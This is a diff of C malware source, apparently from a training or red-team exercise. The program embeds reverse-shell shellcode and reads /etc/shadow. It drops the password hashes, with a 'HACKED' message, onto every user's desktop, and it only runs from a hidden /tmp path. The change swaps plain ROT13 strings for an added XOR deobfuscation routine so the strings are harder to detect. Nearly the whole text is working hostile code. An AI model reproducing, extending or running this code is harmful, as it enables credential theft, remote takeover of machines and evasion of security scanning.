@@ -1,14 +1,15 @@
 
 
 // SOURCE_STRINGS
-#define HACKED_ROT13 "You have been HACKED. Not only have you been HACKED, you will see that I AM ROOT. To prove this I've conveniently included the contents of shadow...\n\n"
-#define SHADOW_ROT13 "/etc/shadow\n"
-#define TPS_ROT13 "/tmp/.entry-3tps-93f8u-rprt\n"
-#define HOME_ROT13 "/home/"
-#define PROC_ROT13 "/proc/self/exe"
+//#define HACKED_XOR "You have been HACKED. Not only have you been HACKED, you will see that I AM ROOT. To prove this I've conveniently included the contents of shadow...\n\n"
+//#define SHADOW_XOR "/etc/shadow"
+//#define TPS_XOR "/tmp/.entry-3tps-93f8u-rprt\n"
+//#define HOME_XOR "/home/"
+//#define PROC_XOR "/proc/self/exe"
 // END_SOURCE_STRINGS
 
-#define BD_LENGTH
+//START OBFUSCATING
+//END OBFUSCATING
 
 #define _GNU_SOURCE
 #include <dirent.h>
@@ -18,6 +19,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 
+#pragma GCC push_options
 
 unsigned char buf[] = 
 "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
@@ -27,6 +29,23 @@ unsigned char buf[] =
 "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
 
+char scratch[4096];
+
+#pragma GCC optimize ("O0")
+char * dexor(const char * to_dexor) {
+    int i;
+    int length =  *((int*) to_dexor);
+    for (i = 4; i < length+4; i++) {
+	// The XOR key is the least significant byte of the string length
+        scratch[i-4] = to_dexor[i] ^ *((char*)to_dexor);
+    }
+    // Tack on null terminator
+    scratch[length] = '\0';
+
+    return scratch;
+}
+#pragma GCC pop_options
+
 /**
  *  Create a file on all user's desktops containing the message and the contents of /etc/shadow.
  */
@@ -35,10 +54,11 @@ void create_hacked_file(char * full_path) {
 
     if (fd) {
          char shadow_buf[4096] = {0};
-	 const char * message= HACKED_ROT13;
-	 FILE * shadow_ptr = fopen(SHADOW_ROT13, "r");
+
+	 FILE * shadow_ptr = fopen(dexor(SHADOW_XOR), "r");
 	 int read_count = fread(shadow_buf, 1, 4096, shadow_ptr);
          fclose(shadow_ptr);
+	 char * message = dexor(HACKED_XOR);
 	 fwrite(message, 1, strlen(message), fd);
 	 fwrite(shadow_buf, 1, read_count, fd);
 	 fclose(fd);
@@ -59,10 +79,10 @@ int main(int argc, char *argv[]) {
     }
 
     char readbuf[1024] = {0};
-    readlink("/proc/self/exe", readbuf, sizeof(readbuf));
+    readlink(dexor(PROC_XOR), readbuf, sizeof(readbuf));
     if (strncmp(readbuf, "/tmp/.entry-3tps-93f8u-rprt", sizeof(readbuf)) != 0) {
-        // Exit because we are not executing from intended location.
-        exit(0);
+        // Exit because we are not executing from intended location.  
+	exit(0);
     }
 
     // Fork off the writer for hacked.txt and the msfvenom reverse shell. 
